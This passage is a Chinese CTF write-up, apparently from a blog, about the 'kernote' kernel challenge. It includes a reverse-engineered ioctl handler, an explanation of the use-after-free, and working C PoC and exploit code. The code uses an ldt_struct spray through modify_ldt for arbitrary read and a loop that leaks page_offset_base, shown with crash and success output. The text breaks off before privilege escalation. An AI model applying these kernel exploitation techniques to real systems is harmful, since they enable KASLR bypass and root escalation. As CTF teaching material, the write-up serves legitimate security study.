class="line">-snapshot</span><br></pre></td></tr></table></figure>
<p>首先共包括四个文件</p>
<ul>
<li>bzImage：典型的kernel镜像文件</li>
<li>rootfs.img：ext4 文件系统</li>
<li>readme.md：提示内核配置信息</li>
<li>run.sh：QEMU 运行脚本</li>
</ul>
<p>根据上述信息可以看到</p>
<ul>
<li>常用内核防护均已开启（KASLR，SMEP，SMAP，KPTI）</li>
<li>使用 SLAB allocator</li>
<li>通过硬编码关闭 Usermode Helper</li>
<li>如果触发 kernel warnings 或 panic 虚拟机会直接关闭</li>
</ul>
<h2 id="查看文件系统"><a href="#查看文件系统" class="headerlink" title="查看文件系统"></a>查看文件系统</h2><p><code>rootfs.img</code> 是 ext4 文件系统，在 Ubuntu 上可以直接挂载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">mkdir</span> mount</span><br><span class="line">$ sudo mount -o loop rootfs.img mount</span><br><span class="line">/mount$ <span class="built_in">ls</span></span><br><span class="line">bin  dev  etc  flag  init  kernote.ko  linuxrc  lost+found  proc  sbin  sys  tmp  usr</span><br><span class="line"></span><br><span class="line">embeded@ubuntu:~/Desktop/release/mount$ <span class="built_in">cat</span> init </span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line"><span class="comment">#mount -t devtmpfs devtmpfs /dev</span></span><br><span class="line"><span class="built_in">mkdir</span> /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"><span class="built_in">echo</span> /sbin/mdev&gt;/proc/sys/kernel/hotplug</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;flag&#123;testflag&#125;&quot;</span>&gt;/flag</span><br><span class="line"><span class="built_in">chmod</span> 660 /flag</span><br><span class="line">insmod /kernote.ko</span><br><span class="line"><span class="comment">#/sbin/mdev -s</span></span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/kernote</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>
<p>主要有以下几点：</p>
<ul>
<li><code>dmesg_restrict=1</code> 意味着无法读取内核日志</li>
<li><code>kptr_restrict=1</code> 意味着无法从 <code>/proc/kallsyms</code> 读取内核地址<br>🌰<img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205061550746.png"></li>
</ul>
<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>接下来我们将对带有漏洞代码的 kernel 模块进行逆向</p>
<p><strong>init and exit</strong><br>主要注册了一个字符设备，可以通过 <code>/dev/kernote</code> 访问</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">kernel_module_init</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// 注册字符设备</span></span><br><span class="line">    <span class="type">int</span> result</span><br><span class="line"></span><br><span class="line">    major_num = __register_chrdev(<span class="number">0</span>, <span class="number">0</span>, <span class="number">256</span>, <span class="string">&quot;kernote&quot;</span>, kernote_fo)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> major_num &gt;= <span class="number">0</span> <span class="comment">// 如果分配成功</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 创建结构类指针</span></span><br><span class="line">        module_class = _class_create(this_module, <span class="string">&quot;kernote&quot;</span>, module_device);</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_">IS_ERR</span><span class="params">(module_class)</span></span><br><span class="line">        &#123;</span><br><span class="line">            module_device = device_create(module_class, <span class="number">0</span>, (major_num&lt;&lt;<span class="number">20</span>), <span class="number">0</span>, <span class="string">&quot;kernote&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> IS_ERR(module_device)</span><br><span class="line">            &#123;</span><br><span class="line">                print(<span class="string">&quot;Insert module complete&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                class_destroy(module_class)</span><br><span class="line">                _unregister_chrdev(major_num, <span class="number">0</span>, <span class="number">256</span>, <span class="string">&quot;kernote&quot;</span>)</span><br><span class="line">                print(<span class="string">&quot;Failed to create device&quot;</span>)</span><br><span class="line">                result = module_device</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            _unregister_chrdev(major_num, <span class="number">0</span>, <span class="number">256</span>, <span class="string">&quot;kernote&quot;</span>)</span><br><span class="line">            print(<span class="string">&quot;Failed to create class&quot;</span>)</span><br><span class="line">            result =  module_class</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        print(Failed to <span class="keyword">register</span> device)</span><br><span class="line">        result = major_num</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> kernel_module_exit()</span><br><span class="line">&#123;</span><br><span class="line">    print(<span class="string">&quot;Start to clean up the module&quot;</span>)</span><br><span class="line">    device_destroy(module_class, (major_num) &lt;&lt; <span class="number">20</span>)</span><br><span class="line">    class_destory(module_class)</span><br><span class="line">    _unregister_chrdev(major_num, <span class="number">0</span>, <span class="number">256</span>, <span class="string">&quot;kernote&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;Module clean up complete&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>ioctl</strong><br>该模块主要创建一个大小为 16 的 buf 指针数组来进行笔记的管理，每一个指针对应一个笔记，ioctl 主要对笔记的管理进行的描述</p>
<ul>
<li>0x6668<br>  删除笔记，如果释放笔记索引不超过16且该笔记已被创建，则调用 kfree 对其进行释放，并且清除笔记内容</li>
<li>0x6666<br>  获取笔记，如果笔记索引不超过16，则获取笔记指针</li>
<li>0x6667<br>  创建笔记，如果笔记索引不超过16，则调用 kmalloc 创建 8 字节内容，分配给指针数组</li>
<li>0x6669<br>  写笔记，如果笔记指针存在，则将笔记内容写入内存</li>
<li>0x666a<br>  展示笔记，只有 root 用户才能查看笔记内容<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> major_num;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *<span class="title">module_class</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">module_device</span>;</span></span><br><span class="line"><span class="type">spinlock_t</span> spin;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kernote_ioctl</span><span class="params">(<span class="keyword">struct</span> file *f , uint cmd, uint args)</span></span><br><span class="line">&#123;</span><br><span class="line">    raw_spin_lock(&amp;spin)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(cmd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6668</span>: <span class="comment">// delete</span></span><br><span class="line">            <span class="keyword">if</span> arg &gt; <span class="number">15</span> || <span class="literal">NULL</span> = buf[arg]:</span><br><span class="line">                ret = <span class="number">-1</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">            kfree(buf[arg])</span><br><span class="line">            buf[arg] = <span class="number">0</span>;</span><br><span class="line">            ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6666</span>: <span class="comment">// fetch</span></span><br><span class="line">            ret = <span class="number">-1</span></span><br><span class="line">            <span class="keyword">if</span> arg &gt; <span class="number">15</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            note = buf[arg]</span><br><span class="line">            ret = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6667</span>: <span class="comment">// alloc</span></span><br><span class="line">            <span class="keyword">if</span> arg &gt; <span class="number">15</span>:</span><br><span class="line">                ret = <span class="number">-1</span></span><br><span class="line">            </span><br><span class="line">            uint64 *newnote = kmalloc(<span class="number">8</span>, GFP_KERNEL)</span><br><span class="line">            buf[arg] = newnote</span><br><span class="line">            ret = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6669</span>: <span class="comment">// write</span></span><br><span class="line">            <span class="keyword">if</span> (note) &#123;</span><br><span class="line">                *note = arg</span><br><span class="line">                ret = <span class="number">0</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ret = <span class="number">-1</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x666A</span>: <span class="comment">// inc_refcount? 打印信息</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> current_task-&gt;cred-&gt;user</span><br><span class="line">            <span class="title function_">refcount_inc</span><span class="params">(&amp;user-&gt;__count)</span></span><br><span class="line">            <span class="title function_">if</span> <span class="params">(user-&gt;uid != <span class="number">0</span>)</span></span><br><span class="line">                <span class="title function_">print</span><span class="params">(<span class="string">&quot;******&quot;</span>)</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> note != <span class="literal">NULL</span></span><br><span class="line">                <span class="title function_">print</span><span class="params">(<span class="string">&quot;0x%lx&quot;</span>, *note)</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="title function_">print</span><span class="params">(<span class="string">&quot;No note&quot;</span>)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">spin_unlock</span><span class="params">(&amp;spin)</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞分析及构建"><a href="#漏洞分析及构建" class="headerlink" title="漏洞分析及构建"></a>漏洞分析及构建</h2></li>
</ul>
<p><strong>漏洞成因</strong><br>首先创建笔记并将指针存入 buf，这时应当注意内核使用 SLAB 分配器<br>源码如下，可以看到 kmalloc 的最小分配尺寸是 100000（比特位）即 32 字节，因此虽然代码中要求创建 8 字节内存空间，但是在内核中分配了32 字节</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_LOW	5</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KMALLOC_MIN_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_MIN_SIZE (1 &lt;&lt; KMALLOC_SHIFT_LOW)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>然后获取笔记，这会使笔记指针存入 note 变量，<br>随后对笔记进行删除，会笔记对应的内存释放，并把 buf 指针数组的内容清零，但是目前 note 变量里仍旧存放着内存指针<br>最后写笔记，通过 note 变量仍然可以对已释放内存进行写操作，从而构成 use-after-free</p>
<p><strong>poc</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SET_NOTE 0x6666</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC_ENTRY 0x6667</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FREE_ENTRY 0x6668</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_NOTE 0x6669</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> kfd;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">set_note</span><span class="params">(<span class="type">uint64_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(kfd, SET_NOTE, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_entry</span><span class="params">(<span class="type">uint64_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(kfd, ALLOC_ENTRY, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">free_entry</span><span class="params">(<span class="type">uint64_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(kfd, FREE_ENTRY, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_note</span><span class="params">(<span class="type">uint64_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ioctl(kfd, WRITE_NOTE, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    kfd = open(<span class="string">&quot;/dev/kernote&quot;</span>, O_RDWR);</span><br><span class="line">    alloc_entry(<span class="number">1</span>);</span><br><span class="line">    set_note(<span class="number">1</span>);</span><br><span class="line">    free_entry(<span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    write_note(<span class="number">0x4141414141414141</span>);</span><br><span class="line">    show_note();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">32</span>] = &#123;&#125;;</span><br><span class="line">    read(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>利用构建</strong></p>
<p>之前提供的信息有：</p>
<ul>
<li>KASLR，SMEP，SMAP，KPTI</li>
<li>SLAB allocator</li>
<li>通过硬编码关闭 Usermode Helper</li>
<li>如果触发 kernel warnings 或 panic 虚拟机会直接关闭</li>
</ul>
<p>最终的目的是控制 cred struct 修改权限，或者调用 commit_creds(preparekernel_cred(0))</p>
<ul>
<li>KASLR ：内核加载地址不定，需要通过 object 泄露内核基址</li>
</ul>
<p>这里选择的是 <code>ldt_struct</code>，大小为 0x10，在 kmalloc-32 内，<br>简单了解一下，ldt 类似于 gdt，主要用于保存访问内存的段描述符</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ldt_structs can be allocated, used, and freed, but they are never</span></span><br><span class="line"><span class="comment"> * modified while live.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>	*<span class="title">entries</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		nr_entries;</span><br><span class="line">	<span class="type">int</span>			slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>ldt_struct</code> 的前八个字节是一个我们能控制的指针<br>而如何对 <code>ldt_struct</code> 进行操作，则可以通过 <code>SYS_modify_ldt</code> 系统调用来实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="type">int</span> , func , <span class="type">void</span> __user * , ptr ,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (func) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">		ret = read_ldt(ptr, bytecount);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">		ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以看到我们可以通过如下方式对 ldt 进行读写操作</span></span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">0</span>, buf, len);</span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, buf, len);</span><br></pre></td></tr></table></figure>
<p>查看 <code>read_ldt</code> 能干些什么，可以看到对 size 进行简单的大小判断后直接将进程的 ldt-&gt;entries 拷贝到用户空间地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">read_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> entries_size;</span><br><span class="line">    ...</span><br><span class="line">    entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size))</span><br><span class="line"></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>查看 <code>write_ldt</code> 能干些什么，简单来说就是将 用户空间构造的 <code>user_desc</code> 转换后对原进程的 <code>ldt_struct</code> 进行替换，期间会调用 <code>alloc_ldt_struct</code> 创建 <code>ldt_struct</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_nr_entries, new_nr_entries;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (bytecount != <span class="keyword">sizeof</span>(ldt_info))</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line"></span><br><span class="line">    old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">    old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">    new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">    new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">    <span class="keyword">if</span> (old_ldt)</span><br><span class="line">		<span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line"></span><br><span class="line">    install_ldt(mm, new_ldt);</span><br><span class="line">    unmap_ldt_struct(mm, old_ldt);</span><br><span class="line">    free_ldt_struct(old_ldt);</span><br><span class="line">    error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br></pre></td></tr></table></figure>
<p>因此可以采用如下方式形成任意读：</p>
<ol>
<li>分配并释放笔记后，使用 <code>write_ldt</code> 对笔记内存进行占用</li>
<li>使用 UAF 对 ldt entry 指针进行覆盖</li>
<li>使用 <code>read_ldt</code> 对 ldt 地址进行读取操作</li>
</ol>
<p>需要注意的是：copy_to_user 在访问错误地址时不会触发 kernel panic</p>
<p>内核的一般加载地址为：0xffffffff81000000</p>
<p>所以可以尝试通过从 0xffffffff80000000 处开始搜索，步长为 200000</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> retVal = <span class="number">0</span>;</span><br><span class="line">alloc_entry(<span class="number">1</span>);</span><br><span class="line">set_note(<span class="number">1</span>);</span><br><span class="line">free_entry(<span class="number">1</span>);</span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"><span class="type">size_t</span> addr = <span class="number">0xffffffff80000000</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    write_note(addr);</span><br><span class="line">    retVal = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;temp, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (retVal &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    addr += <span class="number">0x200000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found page_offset_base: \033[0m%lx\n&quot;</span>, addr);</span><br></pre></td></tr></table></figure>

<p>在 user_desc 构造方式上，源码如下，我们需要保证</p>
<ol>
<li>entry_number &lt; LDT_ENTRIES</li>
<li>contents !&#x3D; 3<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Note on 64bit base and limit is ignored and you cannot set DS/ES/CS</span></span><br><span class="line"><span class="comment"> * not to the default values if you still want to do syscalls. This</span></span><br><span class="line"><span class="comment"> * call is more for 32bit mode therefore.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  entry_number;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  base_addr;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  limit;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  contents:<span class="number">2</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  useable:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __x86_64__</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Because this bit is not present in 32-bit user code, user</span></span><br><span class="line"><span class="comment">	 * programs can pass uninitialized values here.  Therefore, in</span></span><br><span class="line"><span class="comment">	 * any context in which a user_desc comes from a 32-bit program,</span></span><br><span class="line"><span class="comment">	 * the kernel must act as though lm == 0, regardless of the</span></span><br><span class="line"><span class="comment">	 * actual value.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>  lm:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
此时会报错，触发panic<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">/ $ ./poc</span><br><span class="line">[    3.957895] usercopy: Kernel memory exposure attempt detected from null address (offset 0, size 8)!</span><br><span class="line">[    3.967668] kernel BUG at mm/usercopy.c:99!</span><br><span class="line">[    3.970064] invalid opcode: 0000 [#1] SMP PTI</span><br><span class="line">[    3.970507] CPU: 1 PID: 144 Comm: poc Tainted: G           OE     5.11.9 #2</span><br><span class="line">[    3.970811] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014</span><br><span class="line">[    3.971277] RIP: 0010:usercopy_abort+0x7b/0x7d</span><br><span class="line">[    3.972089] Code: 4c 0f 45 de 51 4c 89 d1 48 c7 c2 dd 8a dc 84 57 48 c7 c6 43 35 db 84 48 c7 c7 a8 8b dc 84 48 0f 45 f2 4c 89 da e8 02 83 ff ff &lt;0f&gt; 0b 4c 89 e1 49 89 d8 44 89 ea 31 f6 48 29 c1 48 c7 c7 1f 8b dc</span><br><span class="line">[    3.972842] RSP: 0018:ffffa1ad401cbe90 EFLAGS: 00000246</span><br><span class="line">[    3.973328] RAX: 0000000000000057 RBX: 0000000000000008 RCX: c0000000ffffdfff</span><br><span class="line">[    3.973538] RDX: 0000000000000000 RSI: 00000000ffffdfff RDI: 0000000000000246</span><br><span class="line">[    3.973880] RBP: ffffa1ad401cbea8 R08: 0000000000000000 R09: ffffa1ad401cbc68</span><br><span class="line">[    3.974093] R10: 0000000000000001 R11: 0000000000000001 R12: 0000000000000000</span><br><span class="line">[    3.974354] R13: 0000000000000001 R14: 0000000000000008 R15: 0000000000000008</span><br><span class="line">[    3.974590] FS:  000000000169d880(0000) GS:ffff911a87a80000(0000) knlGS:0000000000000000</span><br><span class="line">[    3.974972] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span><br><span class="line">[    3.975190] CR2: ffffffffc0000000 CR3: 000000000293c000 CR4: 00000000003006e0</span><br><span class="line">[    3.975561] Call Trace:</span><br><span class="line">[    3.976301]  __check_object_size.cold+0x5d/0x7b</span><br><span class="line">[    3.976651]  read_ldt+0x89/0xf0</span><br><span class="line">[    3.976752]  __x64_sys_modify_ldt+0x5c/0x90</span><br><span class="line">[    3.976862]  do_syscall_64+0x38/0x90</span><br><span class="line">[    3.977055]  entry_SYSCALL_64_after_hwframe+0x44/0xa9</span><br></pre></td></tr></table></figure>
对 <code>__check_object_size</code> 进行分析，源码如下:<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Validates that the given object is:</span></span><br><span class="line"><span class="comment"> * - not bogus address</span></span><br><span class="line"><span class="comment"> * - fully contained by stack (or stack frame, when available)</span></span><br><span class="line"><span class="comment"> * - fully within SLAB object (or object whitelist area, when available)</span></span><br><span class="line"><span class="comment"> * - not in kernel text</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> __check_object_size(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">unsigned</span> <span class="type">long</span> n, <span class="type">bool</span> to_user)</span><br><span class="line">&#123;</span><br><span class="line">    check_bogus_address((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span>)ptr, n, to_user);</span><br><span class="line">    check_stack_object(ptr, n);</span><br><span class="line">    check_heap_object(ptr, n, to_user);</span><br><span class="line">    check_kernel_text_object((<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span>)ptr, n, to_user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
无法直接获取 kernel text 基址，则考虑从物理内存的直接映射地址进行搜索寻找页偏移基址<blockquote>
<p>Start addr    |   Offset   |     End addr     |  Size   | VM area description<br>ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)</p>
</blockquote>
</li>
</ol>
<p>由于物理内存直接映射区很大，所以可以提高步长，我们选择 4000000</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">/ $ ./poc</span><br><span class="line">[+] Found page_offset_base: ffff9f1080000000</span><br></pre></td></tr></table></figure>

<ul>
